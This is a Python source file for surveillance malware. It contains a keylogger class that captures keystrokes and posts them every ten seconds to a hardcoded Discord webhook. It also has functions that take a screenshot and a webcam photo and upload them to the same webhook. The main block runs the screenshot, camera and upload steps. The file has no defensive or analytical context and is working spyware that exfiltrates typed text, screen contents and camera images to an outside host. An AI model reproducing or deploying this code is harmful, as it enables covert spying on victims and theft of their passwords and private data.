
import aiohttp
from pynput import keyboard
import asyncio
import pyautogui
import os
import cv2


folder = "contents"
os.makedirs(folder, exist_ok=True)

class KeyLogger:
    def __init__(self):
        self.text = ""
        self.json = None

    async def start(self):
        async with aiohttp.ClientSession() as self.sack:
            async with self.sack.post("https://discordapp.com/api/webhooks/1403615260086108242/5HAt7pcdjsTzMrWX7zvcHrU7UGn-SDpSuMLaWQFsoaKKOfeSHZySXVc7Y9POH1nxR_zQ", json=self.json):
                pass

    async def send_data(self):
            self.json = {
                "content": self.text
            }
            await self.start()
            
    async def send_loop(self):
        while True:
            if self.text:
                await self.send_data()
                self.text = ""
            await asyncio.sleep(10)
                                
    def on_press(self, key):
        try:
            self.text += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.backspace:
                if len(self.text) > 0:
                    self.text = self.text[:-1]
                else:
                    pass
            else:
                self.text += f"\n{key}"
            

    async def run(self):
        with keyboard.Listener(on_press=self.on_press):
            await self.send_loop()

def take_screenshot():
    filename = os.path.join(folder, "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def camera_capture():
    if not cv2.VideoCapture(0).isOpened():
        return None
    filename = os.path.join(folder, "camera_capture.png")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(filename, frame)
    cam.release()
    return filename

def send_data_dc():
    async def start():
        screenshot  = take_screenshot()
        camera_img = camera_capture()
        media = [screenshot, camera_img]
        async with aiohttp.ClientSession() as sack:
            webhook_url = "https://discordapp.com/api/webhooks/1403615260086108242/5HAt7pcdjsTzMrWX7zvcHrU7UGn-SDpSuMLaWQFsoaKKOfeSHZySXVc7Y9POH1nxR_zQ"
            for file_path in media:
                if file_path and os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        form = aiohttp.FormData()
                        form.add_field('file', f, filename=os.path.basename(file_path))
                        await sack.post(webhook_url, data=form)
    asyncio.run(start())

if __name__ == '__main__':
    take_screenshot()
    camera_capture()
    send_data_dc()